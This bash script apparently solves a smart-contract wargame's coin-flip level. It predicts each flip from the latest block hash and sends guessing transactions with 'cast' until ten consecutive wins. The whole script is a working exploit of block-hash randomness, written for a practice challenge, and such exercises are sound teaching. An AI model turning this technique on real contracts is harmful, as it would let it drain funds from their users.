#!/usr/bin/env bash
CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

FACTOR=57896044618658097711785492504343953926634992332820282019728792003956564819968

WINS=0
while [ ${WINS} -lt 10 ]
do
	LAST_BLOCK_HASH=$(cast block | awk '$1 == "hash" {print $2}' | cast to-dec)
	GUESS=$(echo "" | awk '{if('${LAST_BLOCK_HASH}' > '${FACTOR}') { print "true" } else { print "false" }}')

	echo "Flipping..."

	# Specify gas limit to avoid an estimation that will revert because of the block check in the code
	cast send \
		--private-key $PRIVATE_KEY \
		--gas-limit 73000 \
		${CONTRACT} \
		$(cast calldata "flip(bool)(bool)" ${GUESS})

	WINS=$(cast call ${CONTRACT} "$(cast sig 'consecutiveWins()(uint256)')" | cast to-dec)
	echo "Consecutive wins: ${WINS}"
done

echo "Level completed, submit instance"
